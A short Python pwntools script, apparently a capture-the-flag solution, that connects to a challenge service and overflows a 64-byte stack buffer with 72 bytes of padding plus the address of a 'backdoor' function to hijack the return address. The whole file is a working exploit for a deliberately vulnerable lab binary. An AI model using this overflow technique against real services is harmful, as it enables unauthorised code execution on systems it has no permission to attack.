#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '9102'))

context(arch='amd64', os='linux', log_level='info')

elf = ELF(os.path.join(HERE, '..', 'files', 'pwn'))
backdoor = elf.symbols['backdoor']

p = remote(HOST, PORT)
p.recvuntil(b'input:')
# buf[64] 在 rbp-0x40，返回地址在 rbp+8：64 + 8 = 72
p.sendline(b'A' * 72 + p64(backdoor))
print(p.recvall(timeout=3).decode(errors='replace'))
